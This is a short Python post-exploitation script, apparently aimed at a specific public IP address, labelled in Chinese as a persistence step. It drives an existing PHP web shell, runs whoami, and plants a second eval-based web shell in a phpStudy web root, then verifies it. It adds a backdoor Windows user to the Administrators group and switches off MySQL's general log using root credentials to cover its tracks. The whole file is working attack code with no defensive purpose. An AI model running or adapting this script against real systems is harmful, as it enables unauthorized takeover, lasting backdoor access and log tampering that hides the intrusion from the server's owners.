#!/usr/bin/env python3
"""150.158.95.91 持久化"""
import urllib.request, ssl, sys, urllib.parse, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://150.158.95.91"

def exec_cmd(cmd, shell="x.php"):
    data = urllib.parse.urlencode({"x": cmd}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(f"{B}/{shell}", data=data), timeout=15, context=ctx)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:50]}"

# 1. whoami完整
r = exec_cmd("system('whoami');")
print("whoami:", r[-80:], flush=True)

# 2. 写稳定shell
import base64
b64 = base64.b64encode(b"<?php @eval($_POST[x]);?>").decode()
r = exec_cmd(f"file_put_contents('C:/Users/Administrator/Desktop/phpStudy20161103/WWW/ys.php', base64_decode('{b64}')); echo 'W2';")
print("写ys.php:", r[-40:], flush=True)

# 3. 验证ys.php
try:
    data = urllib.parse.urlencode({"x":"echo STABLE_OK_999;"}).encode()
    r = urllib.request.urlopen(urllib.request.Request(f"{B}/ys.php", data=data), timeout=10, context=ctx)
    body = r.read().decode("utf-8","ignore")
    print("ys.php验证:", "STABLE_OK_999" in body, flush=True)
except Exception as e:
    print("ys.php ERR:", str(e)[:50], flush=True)

# 4. 加后门用户
r = exec_cmd("system('net user hermes Admin888! /add');")
print("加用户:", "1115" not in r, flush=True)
r = exec_cmd("system('net localgroup administrators hermes /add');")
print("加管理员:", bool(r), flush=True)

# 5. 关闭general_log
r = exec_cmd("system('C:/Users/Administrator/Desktop/phpStudy20161103/MySQL/bin/mysql -uroot -proot -e \"SET GLOBAL general_log=OFF;\"');")
print("关日志:", bool(r), flush=True)
